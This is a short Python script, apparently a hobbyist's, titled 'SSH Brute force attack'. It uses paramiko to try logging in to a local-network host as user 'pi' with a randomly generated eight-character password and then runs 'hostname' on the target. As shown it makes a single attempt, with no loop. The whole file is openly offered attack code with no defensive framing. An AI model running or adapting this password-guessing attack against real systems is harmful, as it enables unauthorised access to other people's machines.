"""
SSH Brute force attack
Creator: ju_dev
"""
from lib.authentication import Authentication

from string import ascii_letters, digits
from random import choice

from paramiko import SSHClient
from paramiko.ssh_exception import AuthenticationException

client = SSHClient()

auth = Authentication(client, "C:\\Users\\JuDEV\\.ssh\\known_hosts")

def try_to_login():  
    password = ''.join(choice(ascii_letters + digits) for _ in range(8))

    auth.ssh_login(hostname="192.168.0.192", username="pi", password=password)
    
    stdin, stdout, stderr = client.exec_command("hostname")
    auth.debug_info(stdin, stdout, stderr)
        
    stdin.close()
    stdout.close()
    stderr.close() 
    
try_to_login()

client.close()

"""
stdin.write("print(50 + 42)")
stdin.channel.shutdown_write()
"""